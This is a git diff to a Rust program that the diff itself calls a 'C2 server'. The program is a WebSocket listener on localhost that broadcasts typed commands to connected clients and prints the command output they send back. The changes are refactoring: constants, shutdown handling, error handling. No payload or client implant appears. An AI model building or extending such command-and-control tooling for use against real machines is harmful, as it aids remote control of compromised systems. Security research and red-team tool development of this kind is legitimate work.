@@ -1,21 +1,20 @@
+mod c2s;
+mod constants;
 mod utils;
+
+use constants::localhost::{LOCALHOST_ADDRESS, LOCALHOST_PORT};
 use futures_util::{SinkExt, StreamExt};
 use tokio::{
     io::{self, AsyncBufReadExt},
     net::TcpListener,
+    signal,
     sync::broadcast,
 };
 use tokio_tungstenite::accept_async;
-use utils::get_public_ip::get_public_ip;
 
 #[tokio::main]
 async fn main() {
-    // let ip = get_public_ip().await.unwrap();
-
-    // Use local IP for testing
-    let addr = format!("{}:8080", "127.0.0.1");
-
-    println!("addr: {}", addr);
+    let addr = format!("{}:{}", LOCALHOST_ADDRESS, LOCALHOST_PORT);
 
     let listener = TcpListener::bind(&addr).await.expect("Failed to bind");
     println!("Listening on: {}", addr);
@@ -45,12 +44,13 @@ async fn main() {
         }
     });
 
-    tokio::signal::ctrl_c()
-        .await
-        .expect("Failed to listen for Ctrl+C");
-    println!("Shutting down the server.");
+    tokio::select! {
+        _ = signal::ctrl_c() => {
+            println!("Ctrl+C received, shutting down...");
+        }
+    }
 
-    drop(tx);
+    println!("C2 server has been shut down.");
 }
 
 async fn handle_connection(stream: tokio::net::TcpStream, mut rx: broadcast::Receiver<String>) {
@@ -72,7 +72,20 @@ async fn handle_connection(stream: tokio::net::TcpStream, mut rx: broadcast::Rec
     });
 
     while let Some(msg) = ws_receiver.next().await {
-        let msg = msg.expect("Error receiving message");
-        println!("Received response: {}", msg.to_text().unwrap());
+        match msg.unwrap().to_text() {
+            Ok(m) => {
+                if m.is_empty() {
+                    println!(
+                        "Command output did not contain any data. Check for the desired output."
+                    );
+                } else {
+                    println!("Received message:\n{}", m);
+                }
+            }
+            Err(e) => {
+                eprintln!("Error receiving message: {}", e);
+                break;
+            }
+        };
     }
 }
